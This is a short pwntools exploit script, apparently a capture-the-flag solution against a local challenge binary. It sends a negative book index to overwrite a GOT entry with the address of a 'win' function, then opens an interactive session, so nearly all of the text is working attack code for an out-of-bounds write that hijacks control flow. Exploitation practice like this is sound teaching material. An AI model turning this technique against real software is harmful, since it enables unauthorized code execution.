from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)

gs = '''
break *0x401260
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

log.info("Overwriting GOT Entry with index: -9")
p.recvuntil(b'Which book would you like to read [0-3]')
index = -9
p.sendline(b"%i" % index)
pause()

log.info('Win Func: 0x%x' % e.sym['win'])
p.sendline(p64(e.sym['win']))
log.info("GOT[printf]=e.sym['win']")
pause()

p.interactive()
